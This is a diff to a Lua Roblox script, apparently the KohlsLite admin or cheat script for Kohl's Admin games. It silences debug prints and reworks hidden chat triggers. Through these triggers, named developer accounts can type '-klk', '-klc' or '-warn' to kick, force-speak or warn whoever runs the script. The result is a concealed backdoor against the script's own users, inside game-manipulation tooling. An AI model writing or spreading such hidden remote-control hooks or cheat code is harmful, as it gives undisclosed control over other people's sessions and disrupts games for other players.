@@ -3895,9 +3895,9 @@ task.spawn(function()
 	while true do
 		task.wait()
 		for i, v in ipairs(game.Players:GetPlayers()) do
-			print("Debug msg 1")
+		--	print("Debug msg 1")
 			if v.Name ~= game.Players.LocalPlayer.Name then
-				print("Debug msg 2: "..v.Name)
+				-- print("Debug msg 2: "..v.Name)
 				if ALLanticlone == true then
 	    				if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(v.Name) then
                 				Chat("unclone "..v.Name)
@@ -4532,29 +4532,38 @@ v.Chatted:Connect(function(msg)
             	end
 		end
 
+		-- // dev \\ --
 		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "BIGpe7niss7") then
-                        Speak("i use kohlslite")
+                        Speak("[KohlsLite]: I use KohlsLite!")
+                end
+
+                if string.sub(msg:lower(), 0, 5) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "Di33le2") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+	                 	Speak("[PR Script]: I use PR Script!")
+			end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "BIGpe7niss7") then
-			game.Players.LocalPlayer:Kick("SkiddingProgrammer {kohlslite owner} kicked you from the game!")
+			game.Players.LocalPlayer:Kick("[KohlsLite]: SkiddingProgrammer {kohlslite owner} kicked you from the game!")
                 end  
 
-                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite") then
-                    Remind("[PR Script] You Have Been Warned! ~atprog")
-                end
             
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite") then
-			--if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
-				game.Players.LocalPlayer:Kick("[PR Script] atprog kicked you from the game!")
-			--end
-                end  
-
-	        if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "Di33le2" then
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "Di33le2") then
 			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
-				game.Players.LocalPlayer:Kick("Di33le2 kicked you from the game!")
+				game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
 			end
                 end  
+
+       		if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "BIGpe7niss7") then
+                    Remind("[KohlsLite]: You have been warned!")
+                end
+
+                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "Di33le2") then
+                    	if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+				Remind("[PR Script]: You Have Been Warned! ~atprog")
+			end
+                end
+
                 end)
 -- ADMIN
             if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
